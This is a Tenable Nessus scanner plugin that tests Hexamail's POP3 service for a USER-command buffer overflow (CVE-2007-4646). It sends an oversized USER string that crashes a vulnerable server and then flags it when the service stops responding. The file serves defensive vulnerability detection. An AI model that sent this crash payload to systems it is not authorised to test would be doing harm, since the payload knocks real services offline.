#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(26015);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2007-4646");
  script_bugtraq_id(25496);
  script_osvdb_id(40171);
  script_xref(name:"EDB-ID", value:"4344");

  script_name(english:"Hexamail Server pop3 Service USER Command Remote Overflow");
  script_summary(english:"Tries to crash the POP3 server");

 script_set_attribute(attribute:"synopsis", value:
"The remote POP3 server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of Hexamail installed on the remote host is affected by a
buffer overflow in its POP3 service component that can be exploited by
an unauthenticated, remote attacker to crash the service or to execute
arbitrary code on the affected host with LOCAL SYSTEM privileges." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/hexamail_bof.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Hexamail version 3.0.1.004 or later as that reportedly
resolves the issue." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(94);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/09/11");
 script_cvs_date("$Date: 2011/08/31 17:29:19 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2007-2011 Tenable Network Security, Inc.");
  script_dependencies("find_service1.nasl");
  script_require_ports("Services/pop3", 110);

  exit(0);
}


include("pop3_func.inc");


port = get_kb_item("Services/pop3");
if (!port) port = 110;
if (!get_port_state(port)) exit(0);


# Make sure the banner looks like Hexamail.
banner = get_pop3_banner(port:port);
if (!banner || "+OK POP3 server ready  <" >!< banner) exit(0);


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);

s = recv_line(socket:soc, length:1024);
if (!strlen(s) || s !~ '^\\+OK')
{
  close(soc); 
  exit(0);
}
if ("Qpopper" >< s) exit(0);


# Try to exploit the issue to crash the application.
c = string("USER ./", crap(1024));
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
close(soc);


# If we didn't get a response...
if (!strlen(s))
{
  # Try to reestablish a connection and read the banner.
  soc2 = open_sock_tcp(port);
  if (soc2) 
  {
    s2 = recv_line(socket:soc2, length:1024);
    close(soc2);
  }
  else s2 = NULL;

  # If we couldn't establish the connection or read the banner,
  # there's a problem.
  if (!soc2 || !strlen(s2))
  {
    security_hole(port);
    exit(0);
  }
}
